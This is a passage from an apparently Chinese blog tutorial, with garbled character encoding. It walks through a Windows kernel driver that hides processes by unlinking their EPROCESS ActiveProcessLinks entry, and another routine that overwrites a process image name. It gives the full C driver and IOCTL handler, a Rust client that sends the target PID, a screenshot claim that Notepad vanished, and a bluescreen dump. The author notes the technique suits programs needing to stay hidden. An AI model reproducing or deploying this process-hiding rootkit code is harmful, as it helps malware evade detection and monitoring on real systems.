</span></span><span style="display:flex;"><span>    PLIST_ENTRY64 pCurNode;
</span></span><span style="display:flex;"><span>    UINT64        uProcessId;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pEprocess = <span style="color:#008b45">PsGetCurrentProcess</span>();
</span></span><span style="display:flex;"><span>    len = <span style="color:#008b45">strlen</span>(pSetImageName-&gt;bImageName);
</span></span><span style="display:flex;"><span>    pActiveProcessLinks =
</span></span><span style="display:flex;"><span>        ((PCHAR)pEprocess + WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">for</span> (PLIST_ENTRY64 pBeginNode = pActiveProcessLinks, pCurNode = pBeginNode;
</span></span><span style="display:flex;"><span>         pCurNode-&gt;Flink != pBeginNode;
</span></span><span style="display:flex;"><span>         pCurNode = pCurNode-&gt;Flink) {
</span></span><span style="display:flex;"><span>        pCurProcess =
</span></span><span style="display:flex;"><span>            (PEPROCESS)((PCHAR)pCurNode -
</span></span><span style="display:flex;"><span>                        WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET);
</span></span><span style="display:flex;"><span>        uProcessId = <span style="color:#008b45">PsGetProcessId</span>(pCurProcess);
</span></span><span style="display:flex;"><span>        <span style="color:#8b008b;font-weight:bold">if</span> (uProcessId == pSetImageName-&gt;pid) {
</span></span><span style="display:flex;"><span>            <span style="color:#228b22">// copy new string to cover the old string
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span>
</span></span><span style="display:flex;"><span>            <span style="color:#008b45">kprintf</span>(<span style="color:#cd5555">&#34;[+ Hide Process R0] found the process pid</span><span style="color:#cd5555">\r\n</span><span style="color:#cd5555">&#34;</span>, uProcessId);
</span></span><span style="display:flex;"><span>            pOldImageName = <span style="color:#008b45">PsGetProcessImageFileName</span>(pCurProcess);
</span></span><span style="display:flex;"><span>            <span style="color:#008b45">RtlCopyMemory</span>(pOldImageName, pSetImageName-&gt;bImageName, len);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#8b008b;font-weight:bold">return</span> STATUS_SUCCESS;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">return</span> STATUS_UNSUCCESSFUL;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="r0æ¶ˆé™¤è¿›ç¨‹">R0æ¶ˆé™¤è¿›ç¨‹</h3>
<p>è¿™é‡Œä¸»è¦æ˜¯<strong>R0çš„æ–­é“¾</strong></p>
<p>EPROCESSæ˜¯è¿›ç¨‹åœ¨å†…æ ¸ä¸­çš„ç»“æ„ä½“ï¼Œä¸€ä¸ªè¿›ç¨‹ä¸€ä¸ªEPROCESSï¼Œ<code>EPROCESSä¸­-&gt;ActiveProcessLinks</code>å€¼æ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨ï¼ŒæŒ‡å‘çš„æ˜¯å…¶ä»–è¿›ç¨‹ã€‚</p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>copy
</span></span><span style="display:flex;"><span><span style="color:#228b22">//0xa40 bytes (sizeof)
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span><span style="color:#8b008b;font-weight:bold">struct</span> _EPROCESS
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">struct</span> _KPROCESS Pcb;                                                   <span style="color:#228b22">//0x0
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span>    <span style="color:#8b008b;font-weight:bold">struct</span> _EX_PUSH_LOCK ProcessLock;                                       <span style="color:#228b22">//0x438
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span>    VOID* UniqueProcessId;                                                  <span style="color:#228b22">//0x440
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span>    <span style="color:#8b008b;font-weight:bold">struct</span> _LIST_ENTRY ActiveProcessLinks;                                  <span style="color:#228b22">//0x448
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span>    <span style="color:#8b008b;font-weight:bold">struct</span> _EX_RUNDOWN_REF RundownProtect;                                  <span style="color:#228b22">//0x458
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span>    ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><pre tabindex="0"><code class="language-mer" data-lang="mer">					_eprocess1                   _eprocess2
					.........                    .........
					.........                    .........
					ActiveProcessLinks -&gt; {      ActiveProcessLinks -&gt; {
------------------&gt;	    Flink ------------------&gt;    Flink ------------------&gt;
&lt;------------------   	Blink &lt;------------------    Blink &lt;------------------
					}                            }
</code></pre><p>ç„¶å<code>EPROCESS-&gt;UniqueProcessId</code>è¡¨ç¤ºçš„æ˜¯è¿™ä¸ªè¿›ç¨‹çš„pidã€‚</p>
<p>æ‰€æœ‰æˆ‘ä»¬å¯ä»¥ä¾¿åˆ©æ‰€æœ‰è¿›ç¨‹ï¼Œç„¶åå¯¹æ¯”pidæ˜¯å¦æ˜¯æˆ‘ä»¬çš„ç›®æ ‡pidï¼Œå¦‚æœæ˜¯ï¼Œåˆ™ä»é“¾è¡¨ä¸­æ–­å¼€è¿™ä¸ª<code>ActiveProcessLinks</code>èŠ‚ç‚¹ï¼Œè¿™æ ·å°±å¯ä»¥åšåˆ°éšè—è¿›ç¨‹çš„æ•ˆæœã€‚</p>
<p><strong>é©±åŠ¨éƒ¨åˆ†</strong></p>
<p>è·å–æœ¬è¿›ç¨‹EPROCESSï¼Œä»æœ¬è¿›ç¨‹å¼€å§‹éå†ã€‚æˆ‘è¿™é‡Œæ˜¯ç”¨<code>PsGetCurrentProcess</code>ï¼Œè¿™ç¯‡[æ–‡ç« ](<a href="https://bbs.kanxue.com/thread-278717.htm">https://bbs.kanxue.com/thread-278717.htm</a>è¿˜æå‡ºä¸€ç§ä»<code>fs:[0x124]</code>è·å–KPCRå†ï¼Œä¸€å±‚ä¸€å±‚å–å¾—åˆ°EPROCESSçš„æ€è·¯:<code>_KPCR -&gt; _KPRCB -&gt; KTHREAD -&gt; _KAPC_STATE -&gt; _KPROCESS -&gt; _EPROCESS</code>.å¤§ä½¬åˆ†æè¯´è¿™å…¶å®å°±æ˜¯PsGetCurrentProcessçš„ä»£ç å®ç°åŸç†ã€‚</p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pEprocess = <span style="color:#008b45">PsGetCurrentProcess</span>();
</span></span><span style="display:flex;"><span>pActiveProcessLinks =
</span></span><span style="display:flex;"><span>        ((PCHAR)pEprocess + WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET);
</span></span></code></pre></div><p>ç„¶åéå†é“¾è¡¨ï¼Œåˆ¤æ–­æ¯ä¸ªèŠ‚ç‚¹çš„pidæ˜¯å¦æ˜¯ç›®æ ‡pidã€‚å¦‚æœæ˜¯ç›®æ ‡pidåˆ™æ–­å¼€é“¾è¡¨èŠ‚ç‚¹ã€‚</p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">for</span> (PLIST_ENTRY64 pBeginNode = pActiveProcessLinks, pCurNode = pBeginNode;
</span></span><span style="display:flex;"><span>     pCurNode-&gt;Flink != pBeginNode;
</span></span><span style="display:flex;"><span>     pCurNode = pCurNode-&gt;Flink) {
</span></span><span style="display:flex;"><span>    pCurProcess =
</span></span><span style="display:flex;"><span>        (PEPROCESS)((PCHAR)pCurNode -
</span></span><span style="display:flex;"><span>                    WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET);
</span></span><span style="display:flex;"><span>    uProcessId = <span style="color:#008b45">PsGetProcessId</span>(pCurProcess);
</span></span><span style="display:flex;"><span>    <span style="color:#008b45">kprintf</span>(<span style="color:#cd5555">&#34;[+] pid =&gt; {%#llx}</span><span style="color:#cd5555">\r\n</span><span style="color:#cd5555">.&#34;</span>, uProcessId);
</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">if</span> (uProcessId == pid) {
</span></span><span style="display:flex;"><span>        <span style="color:#008b45">kprintf</span>(
</span></span><span style="display:flex;"><span>            <span style="color:#cd5555">&#34;[+ Hide Process R0] Found the Object Process id: %#llx.</span><span style="color:#cd5555">\r\n</span><span style="color:#cd5555">&#34;</span>,
</span></span><span style="display:flex;"><span>            uProcessId);
</span></span><span style="display:flex;"><span>        ((PLIST_ENTRY64)pCurNode-&gt;Blink)-&gt;Flink = pCurNode-&gt;Flink;
</span></span><span style="display:flex;"><span>        ((PLIST_ENTRY64)pCurNode-&gt;Flink)-&gt;Blink = pCurNode-&gt;Blink;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#8b008b;font-weight:bold">goto</span> success;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><strong>å‡½æ•°æ€»ä½“ä»£ç </strong></p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#228b22">/// @brief éšè—æŒ‡å®šè¿›ç¨‹
</span></span></span><span style="display:flex;"><span><span style="color:#228b22">/// @param pid éœ€è¦éšè—çš„è¿›ç¨‹Pid
</span></span></span><span style="display:flex;"><span><span style="color:#228b22">/// @return å¦‚æœéšè—æˆåŠŸåˆ™è¿”å›STATUS_SUCCESSï¼Œå¤±è´¥åˆ™è¿”å›STATUS_UNSUCCESSFUL
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span>NTSTATUS <span style="color:#008b45">HideProcessByPid</span>(UINT64 pid)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    UINT64        uProcessId;
</span></span><span style="display:flex;"><span>    PEPROCESS     pEprocess, pCurProcess;
</span></span><span style="display:flex;"><span>    PLIST_ENTRY64 pActiveProcessLinks;
</span></span><span style="display:flex;"><span>    PLIST_ENTRY64 pCurNode;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pEprocess = <span style="color:#008b45">PsGetCurrentProcess</span>();
</span></span><span style="display:flex;"><span>    pActiveProcessLinks =
</span></span><span style="display:flex;"><span>        ((PCHAR)pEprocess + WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">for</span> (PLIST_ENTRY64 pBeginNode = pActiveProcessLinks, pCurNode = pBeginNode;
</span></span><span style="display:flex;"><span>         pCurNode-&gt;Flink != pBeginNode;
</span></span><span style="display:flex;"><span>         pCurNode = pCurNode-&gt;Flink) {
</span></span><span style="display:flex;"><span>        pCurProcess =
</span></span><span style="display:flex;"><span>            (PEPROCESS)((PCHAR)pCurNode -
</span></span><span style="display:flex;"><span>                        WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET);
</span></span><span style="display:flex;"><span>        uProcessId = <span style="color:#008b45">PsGetProcessId</span>(pCurProcess);
</span></span><span style="display:flex;"><span>        <span style="color:#008b45">kprintf</span>(<span style="color:#cd5555">&#34;[+] pid =&gt; {%#llx}</span><span style="color:#cd5555">\r\n</span><span style="color:#cd5555">.&#34;</span>, uProcessId);
</span></span><span style="display:flex;"><span>        <span style="color:#8b008b;font-weight:bold">if</span> (uProcessId == pid) {
</span></span><span style="display:flex;"><span>            <span style="color:#008b45">kprintf</span>(
</span></span><span style="display:flex;"><span>                <span style="color:#cd5555">&#34;[+ Hide Process R0] Found the Object Process id: %#llx.</span><span style="color:#cd5555">\r\n</span><span style="color:#cd5555">&#34;</span>,
</span></span><span style="display:flex;"><span>                uProcessId);
</span></span><span style="display:flex;"><span>            ((PLIST_ENTRY64)pCurNode-&gt;Blink)-&gt;Flink = pCurNode-&gt;Flink;
</span></span><span style="display:flex;"><span>            ((PLIST_ENTRY64)pCurNode-&gt;Flink)-&gt;Blink = pCurNode-&gt;Blink;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#8b008b;font-weight:bold">goto</span> success;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">return</span> STATUS_UNSUCCESSFUL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>success:
</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">return</span> STATUS_SUCCESS;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>æˆ‘æ˜¯å†™æˆwdmç±»å‹çš„é©±åŠ¨ï¼Œè¿™ä¸ªå‡½æ•°éœ€è¦ä¸€ä¸ªè¿›ç¨‹pidï¼Œæ‰€ä»¥è¦ç”¨æˆ·å±‚ä¼ å…¥Pidã€‚æˆ‘å°†è¿™ä¸ªå‡½æ•°å®šä¹‰åœ¨<code>IRP_MJ_DEVICE_CONTROL</code>ä¸‹</p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#1e889b">#define IOCTL_HIDE_BY_PID \
</span></span></span><span style="display:flex;"><span><span style="color:#1e889b">    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x6666, METHOD_BUFFERED, FILE_ANY_ACCESS)
</span></span></span><span style="display:flex;"><span><span style="color:#1e889b"></span>
</span></span><span style="display:flex;"><span>NTSTATUS <span style="color:#008b45">CustomControl</span>(PDEVICE_OBJECT pDevice, PIRP pIrp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    PIO_STACK_LOCATION pstack;
</span></span><span style="display:flex;"><span>    UINT64             iocode, in_len, out_len, ioinfo, pid;
</span></span><span style="display:flex;"><span>    NTSTATUS           status;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    status  = STATUS_SUCCESS;
</span></span><span style="display:flex;"><span>    pstack  = <span style="color:#008b45">IoGetCurrentIrpStackLocation</span>(pIrp);
</span></span><span style="display:flex;"><span>    iocode  = pstack-&gt;Parameters.DeviceIoControl.IoControlCode;
</span></span><span style="display:flex;"><span>    in_len  = pstack-&gt;Parameters.DeviceIoControl.InputBufferLength;
</span></span><span style="display:flex;"><span>    out_len = pstack-&gt;Parameters.DeviceIoControl.OutputBufferLength;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">switch</span> (iocode) {
</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">case</span> IOCTL_HIDE_BY_PID:
</span></span><span style="display:flex;"><span>        pid = *(PUINT32)pIrp-&gt;AssociatedIrp.SystemBuffer;
</span></span><span style="display:flex;"><span>        <span style="color:#008b45">kprintf</span>(<span style="color:#cd5555">&#34;[+ Hide Process R0] Recv %#llx from R3.</span><span style="color:#cd5555">\r\n</span><span style="color:#cd5555">&#34;</span>, pid);
</span></span><span style="display:flex;"><span>        status = <span style="color:#008b45">HideProcessByPid</span>(pid);
</span></span><span style="display:flex;"><span>        <span style="color:#8b008b;font-weight:bold">if</span> (!<span style="color:#008b45">NT_SUCCESS</span>(status)) {
</span></span><span style="display:flex;"><span>            <span style="color:#008b45">kprintf</span>(<span style="color:#cd5555">&#34;[! Hide Process R0] Hide Process failed.</span><span style="color:#cd5555">\r\n</span><span style="color:#cd5555">&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        ioinfo = <span style="color:#b452cd">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#8b008b;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">default</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#008b45">kprintf</span>(<span style="color:#cd5555">&#34;[! Hide Process]Recv iocode: %#llx&#34;</span>, iocode);
</span></span><span style="display:flex;"><span>        status = STATUS_UNSUCCESSFUL;
</span></span><span style="display:flex;"><span>        ioinfo = <span style="color:#b452cd">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#8b008b;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pIrp-&gt;IoStatus.Status      = status;
</span></span><span style="display:flex;"><span>    pIrp-&gt;IoStatus.Information = ioinfo;
</span></span><span style="display:flex;"><span>    <span style="color:#008b45">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">return</span> STATUS_SUCCESS;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>å®Œæ•´ä»£ç åœ¨<a href="https://github.com/Military-axe/HideProcessR0">HideProcessR0</a>ä¸­ã€‚</p>
<p><strong>ç”¨æˆ·å±‚éƒ¨åˆ†ä»£ç </strong></p>
<p>ç”¨æˆ·å±‚éƒ¨åˆ†æˆ‘ç›´æ¥æ˜¯ç”¨Rustæ¥ç¼–å†™</p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#1e889b">#[derive(Debug)]</span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">struct</span> <span style="color:#008b45;font-weight:bold">BreakChain</span><span style="color:#bbb"> </span>{}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span><span style="color:#8b008b;font-weight:bold">impl</span><span style="color:#bbb"> </span>BreakChain<span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">fn</span> <span style="color:#008b45">hide_by_pid</span>(pid: <span style="color:#00688b;font-weight:bold">u32</span>)<span style="color:#bbb"> </span>-&gt; <span style="color:#658b00">Result</span>&lt;()&gt;<span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span><span style="color:#8b008b;font-weight:bold">let</span><span style="color:#bbb"> </span>hdevice<span style="color:#bbb"> </span>=<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>CreateFileA(<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span>s!(<span style="color:#cd5555">&#34;</span><span style="color:#cd5555">\\\\</span><span style="color:#cd5555">.</span><span style="color:#cd5555">\\</span><span style="color:#cd5555">HideProcessR0&#34;</span>),<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span>(<span style="color:#00688b">GENERIC_READ</span><span style="color:#bbb"> </span>|<span style="color:#bbb"> </span><span style="color:#00688b">GENERIC_WRITE</span>).<span style="color:#b452cd">0</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span><span style="color:#00688b">FILE_SHARE_NONE</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span><span style="color:#658b00">None</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span><span style="color:#00688b">OPEN_EXISTING</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span><span style="color:#00688b">FILE_ATTRIBUTE_NORMAL</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span><span style="color:#658b00">None</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>)?<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>};<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>debug!(<span style="color:#cd5555">&#34;Open Device success&#34;</span>);<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span><span style="color:#8b008b;font-weight:bold">if</span><span style="color:#bbb"> </span>hdevice.is_invalid()<span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>warn!(<span style="color:#cd5555">&#34;Open Device failed {:?}.&#34;</span>,<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb"> </span>GetLastError()<span style="color:#bbb"> </span>});<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span><span style="color:#8b008b;font-weight:bold">return</span><span style="color:#bbb"> </span><span style="color:#658b00">Err</span>(Error::msg(<span style="color:#cd5555">&#34;Open Device failed.&#34;</span>));<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span><span style="color:#8b008b;font-weight:bold">let</span><span style="color:#bbb"> </span>input_buffer<span style="color:#bbb"> </span>=<span style="color:#bbb"> </span>&amp;pid<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span>*<span style="color:#8b008b;font-weight:bold">const</span><span style="color:#bbb"> </span><span style="color:#00688b;font-weight:bold">u32</span><span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span>*<span style="color:#8b008b;font-weight:bold">const</span><span style="color:#bbb"> </span>c_void;<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>DeviceIoControl(<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span>hdevice,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span>ctl_code(<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                    </span><span style="color:#00688b">FILE_DEVICE_UNKNOWN</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                    </span><span style="color:#b452cd">0x6666</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                    </span><span style="color:#00688b">METHOD_BUFFERED</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                    </span><span style="color:#00688b">FILE_ANY_ACCESS</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span>),<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span><span style="color:#658b00">Some</span>(input_buffer),<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span>size_of::&lt;<span style="color:#00688b;font-weight:bold">u32</span>&gt;()<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span><span style="color:#00688b;font-weight:bold">u32</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span><span style="color:#658b00">None</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span><span style="color:#b452cd">0</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span><span style="color:#658b00">None</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span><span style="color:#658b00">None</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>)?<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>};<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>debug!(<span style="color:#cd5555">&#34;Send pid to driver success&#34;</span>);<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span><span style="color:#658b00">Ok</span>(())<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span><span style="color:#8b008b;font-weight:bold">fn</span> <span style="color:#008b45">ctl_code</span>(device_type: <span style="color:#00688b;font-weight:bold">u32</span>,<span style="color:#bbb"> </span>function: <span style="color:#00688b;font-weight:bold">u32</span>,<span style="color:#bbb"> </span>method: <span style="color:#00688b;font-weight:bold">u32</span>,<span style="color:#bbb"> </span>access: <span style="color:#00688b;font-weight:bold">u32</span>)<span style="color:#bbb"> </span>-&gt; <span style="color:#00688b;font-weight:bold">u32</span> {<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>((device_type)<span style="color:#bbb"> </span>&lt;&lt;<span style="color:#bbb"> </span><span style="color:#b452cd">16</span>)<span style="color:#bbb"> </span>|<span style="color:#bbb"> </span>((access)<span style="color:#bbb"> </span>&lt;&lt;<span style="color:#bbb"> </span><span style="color:#b452cd">14</span>)<span style="color:#bbb"> </span>|<span style="color:#bbb"> </span>((function)<span style="color:#bbb"> </span>&lt;&lt;<span style="color:#bbb"> </span><span style="color:#b452cd">2</span>)<span style="color:#bbb"> </span>|<span style="color:#bbb"> </span>(method)<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span>}<span style="color:#bbb">
</span></span></span></code></pre></div><p>è¿è¡Œä¹‹åï¼Œæœç´¢ä¸åˆ°è®°äº‹æœ¬è¿›ç¨‹äº†</p>
<p><img src="https://s2.loli.net/2024/05/27/nEihpY3gI2ukyom.png" alt=""></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘æ‰‹åŠ¨å…³é—­è¿™ä¸ªæ–­å¼€é“¾è¡¨çš„è¿›ç¨‹ä¼šé€ æˆè“å±ï¼Œæ‰€ä»¥ç›®å‰è¿™ä¸ªåªèƒ½ç”¨äºç®€å•çš„demoæ¼”ç¤ºï¼Œæˆ–è€…æŸç§éœ€è¦éšè”½ä¸”ä¸å…³é—­çš„ç¨‹åºã€‚å…·ä½“çš„è“å±æŠ¥é”™ä¿¡æ¯å¦‚ä¸‹ã€‚</p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>EXCEPTION_RECORD:  ffffc2857eb137a8 -- (.exr <span style="color:#b452cd">0xffffc2857eb137a8</span>)
</span></span><span style="display:flex;"><span>ExceptionAddress: <span style="color:#008b45">fffff8066aa4dc11</span> (nt!PspProcessDelete+<span style="color:#b452cd">0x000000000012e731</span>)
</span></span><span style="display:flex;"><span>   ExceptionCode: <span style="color:#008b45">c0000409</span> (Security check failure or stack buffer overrun)
</span></span><span style="display:flex;"><span>  ExceptionFlags: <span style="color:#b452cd">00000001</span>
</span></span><span style="display:flex;"><span>NumberParameters: <span style="color:#b452cd">1</span>
</span></span><span style="display:flex;"><span>   Parameter[<span style="color:#b452cd">0</span>]: <span style="color:#b452cd">0000000000000003</span>
</span></span><span style="display:flex;"><span>Subcode: <span style="color:#b452cd">0x3</span> FAST_FAIL_CORRUPT_LIST_ENTRY 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PROCESS_NAME:  System
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ERROR_CODE: (NTSTATUS) <span style="color:#b452cd">0xc0000409</span> - The system detected an overrun of a stack-based buffer in this application. This overrun could potentially allow a malicious user to gain control of this application.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EXCEPTION_CODE_STR:  c0000409
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EXCEPTION_PARAMETER1:  <span style="color:#b452cd">0000000000000003</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EXCEPTION_STR:  <span style="color:#b452cd">0xc0000409</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>STACK_TEXT:  
